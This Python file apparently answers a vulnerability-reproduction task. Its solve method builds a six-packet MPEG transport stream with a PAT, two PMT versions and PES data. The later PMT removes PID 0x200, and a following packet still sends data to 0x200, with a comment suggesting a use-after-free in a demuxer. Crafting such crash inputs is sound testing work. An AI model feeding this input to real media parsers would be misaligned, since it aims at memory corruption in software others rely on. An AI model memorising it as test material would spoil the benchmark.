import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                for i in range(7, -1, -1):
                    bit = (byte >> i) & 1
                    c31 = (crc >> 31) & 1
                    crc = ((crc << 1) & 0xFFFFFFFF)
                    if c31 ^ bit:
                        crc ^= 0x04C11DB7
            return crc

        def create_ts_packet(pid, payload, counter, payload_start=False):
            header = bytearray([0x47])
            # TEI=0, PUSI=payload_start, Prio=0, PID
            val = (pid & 0x1FFF)
            if payload_start:
                val |= 0x4000
            header.append((val >> 8) & 0xFF)
            header.append(val & 0xFF)
            # SC=00, AFC=01 (Payload only), CC=counter
            header.append(0x10 | (counter & 0x0F))
            
            pkt = bytearray(header)
            
            if payload_start:
                # Pointer field = 0
                pkt.append(0x00)
            
            # Payload filling
            space = 188 - len(pkt)
            if len(payload) > space:
                pkt.extend(payload[:space])
            else:
                pkt.extend(payload)
                # Stuffing with 0xFF
                pkt.extend(b'\xff' * (space - len(payload)))
                
            return bytes(pkt)

        def create_pat(version):
            # Table ID 0x00
            # TSID 1, Version, Sec 0, Last 0
            # Prog 1 -> PID 0x100
            body = bytearray()
            body.extend(struct.pack('>H', 1))
            body.append(0xC0 | ((version & 0x1F) << 1) | 1)
            body.append(0)
            body.append(0)
            body.extend(struct.pack('>H', 1))
            body.extend(struct.pack('>H', 0xE000 | 0x100))
            
            section_len = len(body) + 4
            header = bytearray([0x00, 0xB0 | (section_len >> 8), section_len & 0xFF])
            section = header + body
            crc = mpeg_crc32(section)
            section.extend(struct.pack('>I', crc))
            return section

        def create_pmt(version, streams):
            # Table ID 0x02
            # PCR PID = First stream PID or 0x1FFF
            pcr_pid = streams[0][0] if streams else 0x1FFF
            
            body = bytearray()
            body.extend(struct.pack('>H', 1)) # Prog Num
            body.append(0xC0 | ((version & 0x1F) << 1) | 1)
            body.append(0)
            body.append(0)
            body.extend(struct.pack('>H', 0xE000 | pcr_pid))
            body.extend(struct.pack('>H', 0xF000)) # Prog Info Len
            
            for pid, stype in streams:
                body.append(stype)
                body.extend(struct.pack('>H', 0xE000 | pid))
                body.extend(struct.pack('>H', 0xF000)) # ES Info Len
                
            section_len = len(body) + 4
            header = bytearray([0x02, 0xB0 | (section_len >> 8), section_len & 0xFF])
            section = header + body
            crc = mpeg_crc32(section)
            section.extend(struct.pack('>I', crc))
            return section

        # Construct 6 packets (1128 bytes)
        packets = []
        
        # 1. PAT (PID 0)
        packets.append(create_ts_packet(0, create_pat(0), 0, True))
        
        # 2. PMT Ver 0 (PID 0x100) -> Stream 0x200 (Type 0x0F)
        packets.append(create_ts_packet(0x100, create_pmt(0, [(0x200, 0x0F)]), 0, True))
        
        # 3. Payload for 0x200 (establish stream context)
        # PES packet start
        packets.append(create_ts_packet(0x200, b'\x00\x00\x01\xC0' + b'\xAA'*100, 0, True))
        
        # 4. PMT Ver 1 (PID 0x100) -> Stream 0x201 (Type 0x1B). Implicitly removes 0x200.
        packets.append(create_ts_packet(0x100, create_pmt(1, [(0x201, 0x1B)]), 1, True))
        
        # 5. Payload for 0x200. "Use" after free?
        packets.append(create_ts_packet(0x200, b'\x00\x00\x01\xC0' + b'\xBB'*100, 1, True))
        
        # 6. Null Packet
        packets.append(create_ts_packet(0x1FFF, b'\xFF'*100, 0, False))
        
        return b''.join(packets)